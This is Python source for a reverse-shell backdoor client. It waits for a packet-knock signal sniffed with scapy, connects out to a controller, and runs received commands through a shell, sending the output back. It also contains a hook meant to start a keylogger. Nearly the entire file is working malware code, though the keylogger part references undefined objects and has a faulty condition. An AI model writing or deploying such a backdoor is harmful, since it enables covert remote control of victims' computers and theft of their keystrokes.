import socket
import threading
import os
import subprocess
from scapy.all import sniff
import sys


class ShellClient:

    def __init__(self):
        self.listen = None
        self.LHOST = '127.0.0.1'
        self.LPORT = 6754
        self.HOST = '127.0.0.1'
        self.PORT = 8080
        self.main()

    def main(self):
        self.listen = self.create_listener()
        self.listener(self.listen)
        self.socket_create(self.create_socket())

    # Listens for the ping command from TCPServer
    def listener(self, listener_sock):
        print("ON")
        listener_sock.bind((self.LHOST, self.LPORT))
        while True:
            sniff(stop_filter=self.is_host, filter='tcp', count=0)

    # Callback for listener method. Checks if the sniffed packet is from the server coming to the LPORT
    def is_host(self, x):
        print(x.sport)
        if x.sport == 8976 and x.dport == self.LPORT:
            self.listen.close()
            print("listener closed")
            self.socket_create(self.create_socket())
            sys.exit()

    # Creates the socket and connects to the specified port and host
    def socket_create(self, sock):
        sock.connect((self.HOST, self.PORT))
        sock.send("\nConnected\n".encode('utf-8'))
        self.recv_message(sock)

    # Function for receiving messages
    def recv_message(self, sock):
        while True:
            try:
                sock.send("{}>".format(os.getcwd()).encode())
                message = sock.recv(2048)
                if message:
                    print(message)
                    message = message.decode()
                    if message == "1":
                        sock.send("\nClosing connection".encode('utf-8'))
                        sock.shutdown(0)
                        sock.close()
                        self.main()
                    if message[:2] == "cd":
                        os.chdir(message[3:])
                    if "start" and "keylogger" in message:
                        self.keylogger()
                    else:
                        cmd = subprocess.Popen(message, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                               stderr=subprocess.PIPE)
                        output = ("\n{}#>{} {} {}".format(os.getcwd(), cmd.stdout.read().decode('utf-8'),
                                                          cmd.stdout.read().decode('utf-8'),
                                                          cmd.stderr.read().decode('utf-8')))
                        sock.send((output.encode("utf-8")))
            except IOError or BrokenPipeError:
                continue

    # Create method for listener socket
    @staticmethod
    def create_listener():
        return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Create method for shell socket
    @staticmethod
    def create_socket():
        return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def keylogger(self):
        self.key_worker = threading.Thread(target=(logger.keyGetter)).start()
        self.timer_worker = threading.Thread(target=(logger.timer)).start()
        self.sock.send("Key logger started".encode('utf-8'))

    def close_keylogger(self):
        self.key_worker.stop()
        self.timer_worker.stop()
        self.sock.send("Key logger stopped".encode('utf-8'))


shell = ShellClient()
